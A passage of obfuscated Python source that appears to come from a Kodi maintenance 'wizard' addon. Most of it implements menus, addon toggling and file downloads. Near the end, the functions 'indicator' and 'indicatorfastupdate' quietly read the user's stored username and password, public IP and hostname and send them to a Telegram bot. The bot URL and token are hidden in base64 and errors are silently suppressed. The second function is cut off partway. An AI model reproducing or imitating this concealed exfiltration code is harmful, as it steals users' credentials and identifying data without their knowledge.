					OO00OOOOOOO0O00OO [O00OOOOO00OOOOOOO ]=OO0O00OOO0OOO0000 [OO00O0OOOOO00000O ]#line:3712
				else :#line:3713
					OO0O0000O00O00OO0 .append (OO00O0OOOOO00000O )#line:3714
					OO00OOOOOOO0O00OO [O00OOOOO00OOOOOOO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO0O00OOO0OOO0000 [OO00O0OOOOO00000O ])#line:3715
	if OO0O0000O00O00OO0 ==None :return #line:3716
	if len (OO0O0000O00O00OO0 )>0 :#line:3717
		wiz .addonUpdates ('set')#line:3718
		for O000OOO000O0OO000 in OO0O0000O00O00OO0 :#line:3719
			removeAddon (O00O00OO000OOO0O0 [O000OOO000O0OO000 ],OO0O00OOO0OOO0000 [O000OOO000O0OO000 ],True )#line:3720
		xbmc .sleep (1000 )#line:3722
		if INSTALLMETHOD ==1 :O00OOOOOO0O00O0OO =1 #line:3724
		elif INSTALLMETHOD ==2 :O00OOOOOO0O00O0OO =0 #line:3725
		else :O00OOOOOO0O00O0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3726
		if O00OOOOOO0O00O0OO ==1 :wiz .reloadFix ('remove addon')#line:3727
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3728
def removeAddonDataMenu ():#line:3730
	if os .path .exists (ADDOND ):#line:3731
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3732
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3733
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3734
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3735
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3736
		OOO00O0000000O00O =glob .glob (os .path .join (ADDOND ,'*/'))#line:3737
		for O000O0O00O0000O0O in sorted (OOO00O0000000O00O ,key =lambda OO0000OO0O00OOO00 :OO0000OO0O00OOO00 ):#line:3738
			O00OOOO00000000O0 =O000O0O00O0000O0O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3739
			OO000OO0OO0O0O00O =os .path .join (O000O0O00O0000O0O .replace (ADDOND ,ADDONS ),'icon.png')#line:3740
			OOO0000O0OO0O000O =os .path .join (O000O0O00O0000O0O .replace (ADDOND ,ADDONS ),'fanart.png')#line:3741
			O0O0OO00OOO0O0O0O =O00OOOO00000000O0 #line:3742
			OO000OOO0O0OO000O ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3743
			for O00OOO00OOOOO0OOO in OO000OOO0O0OO000O :#line:3744
				O0O0OO00OOO0O0O0O =O0O0OO00OOO0O0O0O .replace (O00OOO00OOOOO0OOO ,OO000OOO0O0OO000O [O00OOO00OOOOO0OOO ])#line:3745
			if O00OOOO00000000O0 in EXCLUDES :O0O0OO00OOO0O0O0O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0O0OO00OOO0O0O0O #line:3746
			else :O0O0OO00OOO0O0O0O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0O0OO00OOO0O0O0O #line:3747
			addFile (' %s'%O0O0OO00OOO0O0O0O ,'removedata',O00OOOO00000000O0 ,icon =OO000OO0OO0O0O00O ,fanart =OOO0000O0OO0O000O ,themeit =THEME2 )#line:3748
	else :#line:3749
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3750
	setView ('files','viewType')#line:3751
def enableAddons ():#line:3753
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3754
	O0OOOOO00O00OOOO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3755
	O00O0O00OOO0OOO00 =0 #line:3756
	for OOOOOOO000O0O0OO0 in sorted (O0OOOOO00O00OOOO0 ,key =lambda OO0O000OOOOOO00O0 :OO0O000OOOOOO00O0 ):#line:3757
		OOO00O0O00OOOO000 =os .path .split (OOOOOOO000O0O0OO0 [:-1 ])[1 ]#line:3758
		if OOO00O0O00OOOO000 in EXCLUDES :continue #line:3759
		if OOO00O0O00OOOO000 in DEFAULTPLUGINS :continue #line:3760
		OO00O000O000O0OOO =os .path .join (OOOOOOO000O0O0OO0 ,'addon.xml')#line:3761
		if os .path .exists (OO00O000O000O0OOO ):#line:3762
			O00O0O00OOO0OOO00 +=1 #line:3763
			O0OOOOO00O00OOOO0 =OOOOOOO000O0O0OO0 .replace (ADDONS ,'')[1 :-1 ]#line:3764
			O0OO00O0O00OOOO00 =open (OO00O000O000O0OOO )#line:3765
			OO0OO0O0OOO000O0O =O0OO00O0O00OOOO00 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3766
			O00O0O0OOO00OO00O =wiz .parseDOM (OO0OO0O0OOO000O0O ,'addon',ret ='id')#line:3767
			OOO0OOO0O00O0OOOO =wiz .parseDOM (OO0OO0O0OOO000O0O ,'addon',ret ='name')#line:3768
			try :#line:3769
				OOO00OOO000000OOO =O00O0O0OOO00OO00O [0 ]#line:3770
				OO000OOOO00O0000O =OOO0OOO0O00O0OOOO [0 ]#line:3771
			except :#line:3772
				continue #line:3773
			try :#line:3774
				O00OOO00OOO0OO00O =xbmcaddon .Addon (id =OOO00OOO000000OOO )#line:3775
				O00000OOO0OO0OO0O ="[COLOR green][Enabled][/COLOR]"#line:3776
				O0O00OOOOOO0O0000 ="false"#line:3777
			except :#line:3778
				O00000OOO0OO0OO0O ="[COLOR red][Disabled][/COLOR]"#line:3779
				O0O00OOOOOO0O0000 ="true"#line:3780
				pass #line:3781
			OO0O0O000OOOO0000 =os .path .join (OOOOOOO000O0O0OO0 ,'icon.png')if os .path .exists (os .path .join (OOOOOOO000O0O0OO0 ,'icon.png'))else ICON #line:3782
			O0OO00OO0O00O00O0 =os .path .join (OOOOOOO000O0O0OO0 ,'fanart.jpg')if os .path .exists (os .path .join (OOOOOOO000O0O0OO0 ,'fanart.jpg'))else FANART #line:3783
			addFile ("%s %s"%(O00000OOO0OO0OO0O ,OO000OOOO00O0000O ),'toggleaddon',O0OOOOO00O00OOOO0 ,O0O00OOOOOO0O0000 ,icon =OO0O0O000OOOO0000 ,fanart =O0OO00OO0O00O00O0 )#line:3784
			O0OO00O0O00OOOO00 .close ()#line:3785
	if O00O0O00OOO0OOO00 ==0 :#line:3786
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3787
	setView ('files','viewType')#line:3788
def changeFeq ():#line:3790
	O000OO00OO0OOO00O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3791
	O00OO000OO0OOO0O0 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O000OO00OO0OOO00O )#line:3792
	if not O00OO000OO0OOO0O0 ==-1 :#line:3793
		wiz .setS ('autocleanfeq',str (O00OO000OO0OOO0O0 ))#line:3794
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O000OO00OO0OOO00O [O00OO000OO0OOO0O0 ]))#line:3795
def developer ():#line:3797
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3798
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3799
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3800
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3801
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3802
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3803
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3804
	setView ('files','viewType')#line:3806
def download (OO00OO0OOOOO000OO ,O000000OO0OOO00OO ):#line:3811
  OO000O0OOOO0O0O0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3812
  O0000OO0O0OOO00O0 =xbmcgui .DialogProgress ()#line:3813
  O0000OO0O0OOO00O0 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3814
  O000000OO000OOOO0 =os .path .join (OO000O0OOOO0O0O0O ,'isr.zip')#line:3815
  OO0OOOO0000OO0OO0 =urllib2 .Request (OO00OO0OOOOO000OO )#line:3816
  O0000OOOO0000OO0O =urllib2 .urlopen (OO0OOOO0000OO0OO0 )#line:3817
  OO0OO000000O00OOO =xbmcgui .DialogProgress ()#line:3819
  OO0OO000000O00OOO .create ("Downloading","Downloading "+name )#line:3820
  OO0OO000000O00OOO .update (0 )#line:3821
  OO000OOO00O0OOOOO =O000000OO0OOO00OO #line:3822
  O0OO00000O000OO0O =open (O000000OO000OOOO0 ,'wb')#line:3823
  try :#line:3825
    OO0OO000OO0OO0O00 =O0000OOOO0000OO0O .info ().getheader ('Content-Length').strip ()#line:3826
    O00O0O0O0OO00000O =True #line:3827
  except AttributeError :#line:3828
        O00O0O0O0OO00000O =False #line:3829
  if O00O0O0O0OO00000O :#line:3831
        OO0OO000OO0OO0O00 =int (OO0OO000OO0OO0O00 )#line:3832
  O00000OOOO0OOO000 =0 #line:3834
  O00OOOOOOOOO00O0O =time .time ()#line:3835
  while True :#line:3836
        OO00000O00O0O0O0O =O0000OOOO0000OO0O .read (8192 )#line:3837
        if not OO00000O00O0O0O0O :#line:3838
            sys .stdout .write ('\n')#line:3839
            break #line:3840
        O00000OOOO0OOO000 +=len (OO00000O00O0O0O0O )#line:3842
        O0OO00000O000OO0O .write (OO00000O00O0O0O0O )#line:3843
        if not O00O0O0O0OO00000O :#line:3845
            OO0OO000OO0OO0O00 =O00000OOOO0OOO000 #line:3846
        if OO0OO000000O00OOO .iscanceled ():#line:3847
           OO0OO000000O00OOO .close ()#line:3848
           try :#line:3849
            os .remove (O000000OO000OOOO0 )#line:3850
           except :#line:3851
            pass #line:3852
           break #line:3853
        O000O0O00O0OO00O0 =float (O00000OOOO0OOO000 )/OO0OO000OO0OO0O00 #line:3854
        O000O0O00O0OO00O0 =round (O000O0O00O0OO00O0 *100 ,2 )#line:3855
        O0OO000O00OO0O00O =O00000OOOO0OOO000 /(1024 *1024 )#line:3856
        O0O0O000OO00OOOO0 =OO0OO000OO0OO0O00 /(1024 *1024 )#line:3857
        O0000O00OOO0OOO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO000O00OO0O00O ,'teal',O0O0O000OO00OOOO0 )#line:3858
        if (time .time ()-O00OOOOOOOOO00O0O )>0 :#line:3859
          OOO0O0OOO00O0OOO0 =O00000OOOO0OOO000 /(time .time ()-O00OOOOOOOOO00O0O )#line:3860
          OOO0O0OOO00O0OOO0 =OOO0O0OOO00O0OOO0 /1024 #line:3861
        else :#line:3862
         OOO0O0OOO00O0OOO0 =0 #line:3863
        OO0OO00O0OO00OO00 ='KB'#line:3864
        if OOO0O0OOO00O0OOO0 >=1024 :#line:3865
           OOO0O0OOO00O0OOO0 =OOO0O0OOO00O0OOO0 /1024 #line:3866
           OO0OO00O0OO00OO00 ='MB'#line:3867
        if OOO0O0OOO00O0OOO0 >0 and not O000O0O00O0OO00O0 ==100 :#line:3868
            O0O0OOO0OO00OOO0O =(OO0OO000OO0OO0O00 -O00000OOOO0OOO000 )/OOO0O0OOO00O0OOO0 #line:3869
        else :#line:3870
            O0O0OOO0OO00OOO0O =0 #line:3871
        O0O0OO0000OO0O00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0O0OOO00O0OOO0 ,OO0OO00O0OO00OO00 )#line:3872
        OO0OO000000O00OOO .update (int (O000O0O00O0OO00O0 ),"Downloading "+name ,O0000O00OOO0OOO0O ,O0O0OO0000OO0O00O )#line:3874
  OOO00O0OOO000OOOO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3877
  O0OO00000O000OO0O .close ()#line:3879
  extract (O000000OO000OOOO0 ,OOO00O0OOO000OOOO ,OO0OO000000O00OOO )#line:3881
  if os .path .exists (OOO00O0OOO000OOOO +'/scakemyer-script.quasar.burst'):#line:3882
    if os .path .exists (OOO00O0OOO000OOOO +'/script.quasar.burst'):#line:3883
     shutil .rmtree (OOO00O0OOO000OOOO +'/script.quasar.burst',ignore_errors =False )#line:3884
    os .rename (OOO00O0OOO000OOOO +'/scakemyer-script.quasar.burst',OOO00O0OOO000OOOO +'/script.quasar.burst')#line:3885
  if os .path .exists (OOO00O0OOO000OOOO +'/plugin.video.kmediatorrent-master'):#line:3887
    if os .path .exists (OOO00O0OOO000OOOO +'/plugin.video.kmediatorrent'):#line:3888
     shutil .rmtree (OOO00O0OOO000OOOO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3889
    os .rename (OOO00O0OOO000OOOO +'/plugin.video.kmediatorrent-master',OOO00O0OOO000OOOO +'/plugin.video.kmediatorrent')#line:3890
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3891
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3892
  try :#line:3893
    os .remove (O000000OO000OOOO0 )#line:3894
  except :#line:3895
    pass #line:3896
  OO0OO000000O00OOO .close ()#line:3897
def dis_or_enable_addon (OOOO0OO0OOO0O00O0 ,OO000OOO00OOOOO00 ,enable ="true"):#line:3898
    import json #line:3899
    O00OOO0O00OOOO0OO ='"%s"'%OOOO0OO0OOO0O00O0 #line:3900
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOO0OO0OOO0O00O0 )and enable =="true":#line:3901
        logging .warning ('already Enabled')#line:3902
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOOO0OO0OOO0O00O0 )#line:3903
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOO0OO0OOO0O00O0 )and enable =="false":#line:3904
        return xbmc .log ("### Skipped %s, reason = not installed"%OOOO0OO0OOO0O00O0 )#line:3905
    else :#line:3906
        O0OOOOOO0OO0O000O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00OOO0O00OOOO0OO ,enable )#line:3907
        O00OO0000OO0OO0OO =xbmc .executeJSONRPC (O0OOOOOO0OO0O000O )#line:3908
        OO0OO00OO00O00O00 =json .loads (O00OO0000OO0OO0OO )#line:3909
        if enable =="true":#line:3910
            xbmc .log ("### Enabled %s, response = %s"%(OOOO0OO0OOO0O00O0 ,OO0OO00OO00O00O00 ))#line:3911
        else :#line:3912
            xbmc .log ("### Disabled %s, response = %s"%(OOOO0OO0OOO0O00O0 ,OO0OO00OO00O00O00 ))#line:3913
    if OO000OOO00OOOOO00 =='auto':#line:3914
     return True #line:3915
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3916
def chunk_report (OOO0000O0O0O0OO0O ,OO000O0O00000OO00 ,OOOO0OO00O00OOOOO ):#line:3917
   O000O0OO00OO00000 =float (OOO0000O0O0O0OO0O )/OOOO0OO00O00OOOOO #line:3918
   O000O0OO00OO00000 =round (O000O0OO00OO00000 *100 ,2 )#line:3919
   if OOO0000O0O0O0OO0O >=OOOO0OO00O00OOOOO :#line:3921
      sys .stdout .write ('\n')#line:3922
def chunk_read (OOOO00O0OO0OO00OO ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3924
   import time #line:3925
   O00000O0OOO00OO00 =int (filesize )*1000000 #line:3926
   O00OO0000O00OOOOO =0 #line:3928
   OO0OOO00000O0O000 =time .time ()#line:3929
   O00000OO0OOO0OOO0 =0 #line:3930
   logging .warning ('Downloading')#line:3932
   with open (destination ,"wb")as OO0O000O00000OO00 :#line:3933
    while 1 :#line:3934
      O00O0O0000OOOO000 =time .time ()-OO0OOO00000O0O000 #line:3935
      OO0OOO00OO0O00O0O =int (O00000OO0OOO0OOO0 *chunk_size )#line:3936
      OOOO000O0O0000000 =OOOO00O0OO0OO00OO .read (chunk_size )#line:3937
      OO0O000O00000OO00 .write (OOOO000O0O0000000 )#line:3938
      OO0O000O00000OO00 .flush ()#line:3939
      O00OO0000O00OOOOO +=len (OOOO000O0O0000000 )#line:3940
      O0O00000OOO000000 =float (O00OO0000O00OOOOO )/O00000O0OOO00OO00 #line:3941
      O0O00000OOO000000 =round (O0O00000OOO000000 *100 ,2 )#line:3942
      if int (O00O0O0000OOOO000 )>0 :#line:3943
        OOO0OOO0O000O00O0 =int (OO0OOO00OO0O00O0O /(1024 *O00O0O0000OOOO000 ))#line:3944
      else :#line:3945
         OOO0OOO0O000O00O0 =0 #line:3946
      if OOO0OOO0O000O00O0 >1024 and not O0O00000OOO000000 ==100 :#line:3947
          O0OOOOO00O0O0O0O0 =int (((O00000O0OOO00OO00 -OO0OOO00OO0O00O0O )/1024 )/(OOO0OOO0O000O00O0 ))#line:3948
      else :#line:3949
          O0OOOOO00O0O0O0O0 =0 #line:3950
      if O0OOOOO00O0O0O0O0 <0 :#line:3951
        O0OOOOO00O0O0O0O0 =0 #line:3952
      dp .update (int (O0O00000OOO000000 ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O00000OOO000000 ,OO0OOO00OO0O00O0O /(1024 *1024 ),O00000O0OOO00OO00 /(1000 *1000 ),OOO0OOO0O000O00O0 ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O0OOOOO00O0O0O0O0 ,60 ))#line:3953
      if dp .iscanceled ():#line:3954
         dp .close ()#line:3955
         break #line:3956
      if not OOOO000O0O0000000 :#line:3957
         break #line:3958
      if report_hook :#line:3960
         report_hook (O00OO0000O00OOOOO ,chunk_size ,O00000O0OOO00OO00 )#line:3961
      O00000OO0OOO0OOO0 +=1 #line:3962
   logging .warning ('END Downloading')#line:3963
   return O00OO0000O00OOOOO #line:3964
def googledrive_download (OOOO00OO0OO000000 ,O0O000O0O0O0O0O0O ,O00OO000OO0000O0O ,OO000O0OO00OOOO00 ):#line:3966
    O0O000000OO0O00OO =[]#line:3970
    O0OO0OOOO0O000O00 =OOOO00OO0OO000000 .split ('=')#line:3971
    OOOO00OO0OO000000 =O0OO0OOOO0O000O00 [len (O0OO0OOOO0O000O00 )-1 ]#line:3972
    def OOO0O00O0OO00OO00 (O0O0OOOOOOOO0OOOO ):#line:3974
        for O0OO0O00OOOO0O0OO in O0O0OOOOOOOO0OOOO :#line:3976
            logging .warning ('cookie.name')#line:3977
            logging .warning (O0OO0O00OOOO0O0OO .name )#line:3978
            OO00O0OOOO0O000OO =O0OO0O00OOOO0O0OO .value #line:3979
            if 'download_warning'in O0OO0O00OOOO0O0OO .name :#line:3980
                logging .warning (O0OO0O00OOOO0O0OO .value )#line:3981
                logging .warning ('cookie.value')#line:3982
                return O0OO0O00OOOO0O0OO .value #line:3983
            return OO00O0OOOO0O000OO #line:3984
        return None #line:3986
    def O0000O0000O00O0O0 (OOOOO00000O0OO000 ,OO0O000OO0OO000O0 ):#line:3988
        O0OOO0OO0O00OOO00 =32768 #line:3990
        O0O0OOOOOO0OO0OOO =time .time ()#line:3991
        with open (OO0O000OO0OO000O0 ,"wb")as OO0OO000O0O0O000O :#line:3993
            OOO00000OO0OO0OOO =1 #line:3994
            OOOOOO000OOO00000 =32768 #line:3995
            try :#line:3996
                OO0O000O0OO00000O =int (OOOOO00000O0OO000 .headers .get ('content-length'))#line:3997
                print ('file total size :',OO0O000O0OO00000O )#line:3998
            except TypeError :#line:3999
                print ('using dummy length !!!')#line:4000
                OO0O000O0OO00000O =int (OO000O0OO00OOOO00 )*1000000 #line:4001
            for OO0O0O0O0O00O000O in OOOOO00000O0OO000 .iter_content (O0OOO0OO0O00OOO00 ):#line:4002
                if OO0O0O0O0O00O000O :#line:4003
                    OO0OO000O0O0O000O .write (OO0O0O0O0O00O000O )#line:4004
                    OO0OO000O0O0O000O .flush ()#line:4005
                    O0OO00OO000000OOO =time .time ()-O0O0OOOOOO0OO0OOO #line:4006
                    O00OOOO0OOOOO0000 =int (OOO00000OO0OO0OOO *OOOOOO000OOO00000 )#line:4007
                    if O0OO00OO000000OOO ==0 :#line:4008
                        O0OO00OO000000OOO =0.1 #line:4009
                    OO00OOO0OOO00OO00 =int (O00OOOO0OOOOO0000 /(1024 *O0OO00OO000000OOO ))#line:4010
                    OO0O000OOOOOO00OO =int (OOO00000OO0OO0OOO *OOOOOO000OOO00000 *100 /OO0O000O0OO00000O )#line:4011
                    if OO00OOO0OOO00OO00 >1024 and not OO0O000OOOOOO00OO ==100 :#line:4012
                      O0OOOOO000OOOOO00 =int (((OO0O000O0OO00000O -O00OOOO0OOOOO0000 )/1024 )/(OO00OOO0OOO00OO00 ))#line:4013
                    else :#line:4014
                      O0OOOOO000OOOOO00 =0 #line:4015
                    O00OO000OO0000O0O .update (int (OO0O000OOOOOO00OO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO0O000OOOOOO00OO ,O00OOOO0OOOOO0000 /(1024 *1024 ),OO0O000O0OO00000O /(1000 *1000 ),OO00OOO0OOO00OO00 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0OOOOO000OOOOO00 ,60 ))#line:4017
                    OOO00000OO0OO0OOO +=1 #line:4018
                    if O00OO000OO0000O0O .iscanceled ():#line:4019
                     O00OO000OO0000O0O .close ()#line:4020
                     break #line:4021
    OOO0OO0OO0OOO0OOO ="https://docs.google.com/uc?export=download"#line:4022
    import urllib2 #line:4027
    import cookielib #line:4028
    from cookielib import CookieJar #line:4030
    O0OO0O0O0OOOOO0O0 =CookieJar ()#line:4032
    OO0O00000O000OO0O =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0OO0O0O0OOOOO0O0 ))#line:4033
    OOO0000O0000O00OO ={'id':OOOO00OO0OO000000 }#line:4035
    O0O0000OO0O0OOOO0 =urllib .urlencode (OOO0000O0000O00OO )#line:4036
    logging .warning (OOO0OO0OO0OOO0OOO +'&'+O0O0000OO0O0OOOO0 )#line:4037
    O0O0O00O0000OOO0O =OO0O00000O000OO0O .open (OOO0OO0OO0OOO0OOO +'&'+O0O0000OO0O0OOOO0 )#line:4038
    OO00O0O0O00000O0O =O0O0O00O0000OOO0O .read ()#line:4039
    for O0O0OOOOOOO000OOO in O0OO0O0O0OOOOO0O0 :#line:4041
         logging .warning (O0O0OOOOOOO000OOO )#line:4042
    O00000O0O0O00O00O =OOO0O00O0OO00OO00 (O0OO0O0O0OOOOO0O0 )#line:4043
    logging .warning (O00000O0O0O00O00O )#line:4044
    if O00000O0O0O00O00O :#line:4045
        OO0OO0OO000OOO000 ={'id':OOOO00OO0OO000000 ,'confirm':O00000O0O0O00O00O }#line:4046
        OOOO0OOO0O0O000OO ={'Access-Control-Allow-Headers':'Content-Length'}#line:4047
        O0O0000OO0O0OOOO0 =urllib .urlencode (OO0OO0OO000OOO000 )#line:4048
        O0O0O00O0000OOO0O =OO0O00000O000OO0O .open (OOO0OO0OO0OOO0OOO +'&'+O0O0000OO0O0OOOO0 )#line:4049
        chunk_read (O0O0O00O0000OOO0O ,report_hook =chunk_report ,dp =O00OO000OO0000O0O ,destination =O0O000O0O0O0O0O0O ,filesize =OO000O0OO00OOOO00 )#line:4050
    return (O0O000000OO0O00OO )#line:4054
def kodi17Fix ():#line:4055
	O000000OO000000OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:4056
	O0000OO0OO00O0OO0 =[]#line:4057
	for O000OOOOOO0OOO00O in sorted (O000000OO000000OO ,key =lambda O0OOO0O0O00OOO00O :O0OOO0O0O00OOO00O ):#line:4058
		O0OO0OOO000000000 =os .path .join (O000OOOOOO0OOO00O ,'addon.xml')#line:4059
		if os .path .exists (O0OO0OOO000000000 ):#line:4060
			O0OO00OO0O00OO00O =O000OOOOOO0OOO00O .replace (ADDONS ,'')[1 :-1 ]#line:4061
			O00000O000OO0OO00 =open (O0OO0OOO000000000 )#line:4062
			O0O0OO0OO0OOO0OOO =O00000O000OO0OO00 .read ()#line:4063
			O00OOOOO00000O000 =parseDOM (O0O0OO0OO0OOO0OOO ,'addon',ret ='id')#line:4064
			O00000O000OO0OO00 .close ()#line:4065
			try :#line:4066
				OOOO00O0O0000OOO0 =xbmcaddon .Addon (id =O00OOOOO00000O000 [0 ])#line:4067
			except :#line:4068
				try :#line:4069
					log ("%s was disabled"%O00OOOOO00000O000 [0 ],xbmc .LOGDEBUG )#line:4070
					O0000OO0OO00O0OO0 .append (O00OOOOO00000O000 [0 ])#line:4071
				except :#line:4072
					try :#line:4073
						log ("%s was disabled"%O0OO00OO0O00OO00O ,xbmc .LOGDEBUG )#line:4074
						O0000OO0OO00O0OO0 .append (O0OO00OO0O00OO00O )#line:4075
					except :#line:4076
						if len (O00OOOOO00000O000 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0OO00OO0O00OO00O ,xbmc .LOGERROR )#line:4077
						else :log ("Unabled to enable: %s"%O000OOOOOO0OOO00O ,xbmc .LOGERROR )#line:4078
	if len (O0000OO0OO00O0OO0 )>0 :#line:4079
		OO0O0OO0O0O00O00O =0 #line:4080
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:4081
		for O00O0O0OOO0OO0O00 in O0000OO0OO00O0OO0 :#line:4082
			OO0O0OO0O0O00O00O +=1 #line:4083
			OO00O00O000O0O000 =int (percentage (OO0O0OO0O0O00O00O ,len (O0000OO0OO00O0OO0 )))#line:4084
			DP .update (OO00O00O000O0O000 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O0O0OOO0OO0O00 ))#line:4085
			addonDatabase (O00O0O0OOO0OO0O00 ,1 )#line:4086
			if DP .iscanceled ():break #line:4087
		if DP .iscanceled ():#line:4088
			DP .close ()#line:4089
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:4090
			sys .exit ()#line:4091
		DP .close ()#line:4092
	forceUpdate ()#line:4093
def indicator ():#line:4095
       try :#line:4096
          import json #line:4097
          wiz .log ('FRESH MESSAGE')#line:4098
          O0O0O0OO0OOO000O0 =(ADDON .getSetting ("user"))#line:4099
          O0O0OOOOOOO0OO0OO =(ADDON .getSetting ("pass"))#line:4100
          O00000O000000O000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4101
          OOO000O0OOOO0OO0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:4102
          O00O0000OOO0OOO0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4103
          OO0OO0OO0000O0000 =str (json .loads (O00O0000OOO0OOO0O )['ip'])#line:4104
          OO000O000O0000O0O =O0O0O0OO0OOO000O0 #line:4105
          OO0O0O00OO0O00O00 =O0O0OOOOOOO0OO0OO #line:4106
          import socket #line:4107
          O00O0000OOO0OOO0O =urllib2 .urlopen (OOO000O0OOOO0OO0O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO000O000O0000O0O +' - '+OO0O0O00OO0O00O00 +' - '+O00000O000000O000 +' - '+OO0OO0OO0000O0000 ).readlines ()#line:4108
       except :pass #line:4110
def indicatorfastupdate ():#line:4112
       try :#line:4113
          import json #line:4114
          wiz .log ('FRESH MESSAGE')#line:4115
          OO00OOO0000O00OO0 =(ADDON .getSetting ("user"))#line:4116
          OOOO0O0OOOO0000OO =(ADDON .getSetting ("pass"))#line:4117
          OOOO00OO00O000OO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4118
          O000OOO0O0O00OO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:4120
          O0O0O0OOOO000O00O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4121
          OO00O00O0OOO0O00O =str (json .loads (O0O0O0OOOO000O00O )['ip'])#line:4122
          OOOOO000O0OOOOOO0 =OO00OOO0000O00OO0 #line:4123
